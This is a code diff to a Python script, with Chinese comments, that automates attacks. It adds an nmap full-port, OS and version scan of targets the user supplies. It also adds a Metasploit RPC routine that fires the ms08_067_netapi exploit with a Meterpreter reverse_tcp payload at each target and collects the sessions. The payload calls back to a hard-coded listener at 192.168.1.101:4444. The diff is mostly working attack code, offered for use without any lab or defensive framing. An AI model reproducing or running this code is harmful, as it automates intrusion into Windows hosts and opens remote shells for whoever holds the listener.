@@ -67,10 +67,10 @@ def get_targets_from_input():
     choice = input("Do you want to enter targets manually (Y/N)? ").lower()
     if choice == 'y':
         targets = input("Enter the target(s) to scan (comma-separated or range): ")
+        return targets.strip().split(',')
     else:
         targets_file = input("Enter the path to the JSON file containing target list: ")
-        targets = read_json_file(targets_file)
-    return targets.strip()
+        return read_json_file(targets_file)
 
 def save_to_json(data, filename):
     with open(filename, 'w') as json_file:
@@ -80,7 +80,65 @@ def save_to_json(data, filename):
 def read_json_file(filename):
     with open(filename, 'r') as json_file:
         data = json.load(json_file)
-    return data
+        targets = [entry['url'] for entry in data]
+    return targets
+
+def scan_with_nmap(targets):
+    nm = nmap.PortScanner()
+    scan_arguments = '-sS -sV -O -p-'
+    print(f"Scanning {targets} with arguments: {scan_arguments}")
+    nm.scan(hosts=','.join(targets), arguments=scan_arguments)
+
+    results = {}
+    for host in nm.all_hosts():
+        results[host] = {
+            'hostname': nm[host].hostname(),
+            'state': nm[host].state(),
+            'osclass': nm[host].get('osclass', []),
+            'ports': []
+        }
+        for proto in nm[host].all_protocols():
+            ports = nm[host][proto].keys()
+            for port in sorted(ports):
+                port_info = nm[host][proto][port]
+                results[host]['ports'].append({
+                    'port': port,
+                    'state': port_info['state'],
+                    'service': port_info.get('product', ''),
+                    'version': port_info.get('version', ''),
+                    'cpe': port_info.get('cpe', '')
+                })
+    return results
+
+def exploit_with_metasploit(api, target, lhost, lport):
+    api.login()
+    console = api.create_console()
+    console_id = console['id']
+    
+    exploit = 'exploit/windows/smb/ms08_067_netapi'
+    payload = 'windows/meterpreter/reverse_tcp'
+    options = {'RHOSTS': target, 'LHOST': lhost, 'LPORT': lport}
+
+    command = f'use {exploit}\n'
+    api.write_console(console_id, command)
+    for option, value in options.items():
+        command = f'set {option} {value}\n'
+        api.write_console(console_id, command)
+    command = f'set PAYLOAD {payload}\n'
+    api.write_console(console_id, command)
+    command = 'exploit -j\n'
+    api.write_console(console_id, command)
+    
+    time.sleep(10)  # 等待利用模块执行
+    result = api.read_console(console_id)
+    print(result['data'])
+
+    sessions = api.list_sessions()
+    print('Sessions:', sessions)
+
+    # 销毁控制台
+    api.write_console(console_id, 'exit\n')
+    api.write_console(console_id, 'exit\n')  # 在某些情况下，需要两次退出命令
 
 # 示例使用
 tool_choice = select_tool()
@@ -88,6 +146,21 @@ if tool_choice == 'nmap':
     # 获取扫描目标
     nmap_targets = get_targets_from_input()
     print("Nmap Scan Targets:", nmap_targets)
+    
+    # Nmap 扫描
+    nmap_results = scan_with_nmap(nmap_targets)
+    print("Nmap Scan Results:", nmap_results)
+
+    # 保存扫描结果到JSON文件
+    save_to_json(nmap_results, 'nmap_scan_results.json')
 elif tool_choice == 'metasploit':
-    # 您的 Metasploit 代码部分，此处省略
-    pass
+    # 获取扫描目标
+    targets = get_targets_from_input()
+    
+    lhost = '192.168.1.101'
+    lport = 4444
+    
+    # Metasploit 利用
+    msf_api = MetasploitAPI(host='127.0.0.1', port=55553, username='msf', password='your_password')
+    for target in targets:
+        exploit_with_metasploit(msf_api, target, lhost, lport)
